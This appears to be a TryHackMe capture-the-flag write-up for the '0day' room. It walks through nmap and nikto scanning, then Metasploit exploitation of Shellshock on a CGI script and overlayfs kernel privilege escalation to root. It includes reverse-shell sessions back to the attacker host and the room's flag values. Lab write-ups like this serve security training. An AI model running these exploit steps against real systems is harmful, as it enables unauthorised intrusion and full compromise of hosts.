| Category          | Details                                  |
|-------------------|------------------------------------------|
| 📝 **Name**       | [0day](https://tryhackme.com/room/0day)  |  
| 🏷 **Type**       | THM Challenge                            |
| 🖥 **OS**         | Linux                                    |
| 🎯 **Difficulty** | Medium                                   |
| 📁 **Tags**       | Metasploit, CVE-2014-6278, CVE-2015-1328 |

## Task 1: Flags

### user.txt

#### Scan target with `nmap`
```
┌──(magicrc㉿perun)-[~/attack/THM 0day]
└─$ nmap -sS -sC -sV -p- $TARGET                                             
Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-03 14:59 +0100
Nmap scan report for 10.82.141.147
Host is up (0.060s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   1024 57:20:82:3c:62:aa:8f:42:23:c0:b8:93:99:6f:49:9c (DSA)
|   2048 4c:40:db:32:64:0d:11:0c:ef:4f:b8:5b:73:9b:c7:6b (RSA)
|   256 f7:6f:78:d5:83:52:a6:4d:da:21:3c:55:47:b7:2d:6d (ECDSA)
|_  256 a5:b4:f0:84:b6:a7:8d:eb:0a:9d:3e:74:37:33:65:16 (ED25519)
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 0day
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 47.80 seconds
```

#### Use `nikto` to enumerate web server
```
┌──(magicrc㉿perun)-[~/attack/THM 0day]
└─$ nikto -host http://$TARGET
- Nikto v2.5.0
---------------------------------------------------------------------------
+ Target IP:          10.82.141.147
+ Target Hostname:    10.82.141.147
+ Target Port:        80
+ Start Time:         2026-01-03 19:46:00 (GMT1)
---------------------------------------------------------------------------
+ Server: Apache/2.4.7 (Ubuntu)
+ /: The anti-clickjacking X-Frame-Options header is not present. See: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/X-Frame-Options
+ /: The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type. See: https://www.netsparker.com/web-vulnerability-scanner/vulnerabilities/missing-content-type-header/
+ Apache/2.4.7 appears to be outdated (current is at least Apache/2.4.54). Apache 2.2.34 is the EOL for the 2.x branch.
+ /: Server may leak inodes via ETags, header found with file /, inode: bd1, size: 5ae57bb9a1192, mtime: gzip. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-1418
+ OPTIONS: Allowed HTTP Methods: GET, HEAD, POST, OPTIONS .
+ /cgi-bin/test.cgi: Uncommon header '93e4r0-cve-2014-6271' found, with contents: true.
+ /cgi-bin/test.cgi: Site appears vulnerable to the 'shellshock' vulnerability. See: http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2014-6278
+ /admin/: This might be interesting.
+ /backup/: This might be interesting.
+ /css/: Directory indexing found.
+ /css/: This might be interesting.
+ /img/: Directory indexing found.
+ /img/: This might be interesting.
+ /secret/: This might be interesting.
+ /cgi-bin/test.cgi: This might be interesting.
+ /icons/README: Apache default file found. See: https://www.vntweb.co.uk/apache-restricting-access-to-iconsreadme/
+ /admin/index.html: Admin login page/section found.
+ 8909 requests: 0 error(s) and 17 item(s) reported on remote host
+ End Time:           2026-01-03 19:55:41 (GMT1) (581 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
```
[CVE-2014-6278](https://nvd.nist.gov/vuln/detail/CVE-2014-6278) has been discovered in `/cgi-bin/test.cgi`

#### Use Metasploit `exploit/multi/http/apache_mod_cgi_bash_env_exec` to gain foothold
```
┌──(magicrc㉿perun)-[~/attack/THM 0day]
└─$ msfconsole -q
msf > search CVE-2014-6278

Matching Modules
================

   #  Name                                             Disclosure Date  Rank       Check  Description
   -  ----                                             ---------------  ----       -----  -----------
   0  exploit/multi/http/apache_mod_cgi_bash_env_exec  2014-09-24       excellent  Yes    Apache mod_cgi Bash Environment Variable Code Injection (Shellshock)
   1    \_ target: Linux x86                           .                .          .      .
   2    \_ target: Linux x86_64                        .                .          .      .
   3  auxiliary/scanner/http/apache_mod_cgi_bash_env   2014-09-24       normal     Yes    Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner
   4  exploit/multi/http/cups_bash_env_exec            2014-09-24       excellent  Yes    CUPS Filter Bash Environment Variable Code Injection (Shellshock)


Interact with a module by name or index. For example info 4, use 4 or use exploit/multi/http/cups_bash_env_exec

msf > use exploit/multi/http/apache_mod_cgi_bash_env_exec
[*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set RHOSTS 10.82.141.147
RHOSTS => 10.82.141.147
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set TARGETURI /cgi-bin/test.cgi
TARGETURI => /cgi-bin/test.cgi
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > set LHOST tun0
LHOST => tun0
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > run
[*] Started reverse TCP handler on 192.168.132.170:4444 
[*] Command Stager progress - 100.00% done (1092/1092 bytes)
[*] Sending stage (1062760 bytes) to 10.82.141.147
[*] Meterpreter session 1 opened (192.168.132.170:4444 -> 10.82.141.147:35920) at 2026-01-03 20:00:33 +0100

meterpreter > getuid
Server username: www-data
```

#### Capture user flag
```
meterpreter > cat /home/ryan/user.txt
THM{Sh3llSh0ck_r0ckz}
```

### root.txt

#### Escalate to `root` by exploiting [CVE-2015-1328](https://nvd.nist.gov/vuln/detail/CVE-2015-1328)
`exploit/linux/local/overlayfs_priv_esc` has been suggested by `post/multi/recon/local_exploit_suggester`
```
meterpreter > background
[*] Backgrounding session 1...
msf exploit(multi/http/apache_mod_cgi_bash_env_exec) > use exploit/linux/local/overlayfs_priv_esc
[*] Using configured payload linux/x86/shell/reverse_tcp
msf exploit(linux/local/overlayfs_priv_esc) > set SESSION 1
SESSION => 1
msf exploit(linux/local/overlayfs_priv_esc) > set LHOST tun0
LHOST => tun0
msf exploit(linux/local/overlayfs_priv_esc) > set LPORT 5555
LPORT => 5555
msf exploit(linux/local/overlayfs_priv_esc) > set TARGET 0
TARGET => 0
msf exploit(linux/local/overlayfs_priv_esc) > run
[*] Started reverse TCP handler on 192.168.132.170:5555 
[*] Writing to /tmp/dmXXjld6 (13655 bytes)
[*] Writing to /tmp/ofs-lib.so (7752 bytes)
[*] Writing to /tmp/lXqzVpYN (207 bytes)
[*] Sending stage (36 bytes) to 10.82.141.147
[+] Deleted /tmp/dmXXjld6
[+] Deleted /tmp/lXqzVpYN
[*] Command shell session 2 opened (192.168.132.170:5555 -> 10.82.141.147:34685) at 2026-01-04 11:54:17 +0100

# id
uid=0(root) gid=0(root) groups=0(root),33(www-data)
```

#### Capture root flag
```
# cat /root/root.txt
THM{g00d_j0b_0day_is_Pleased}
```
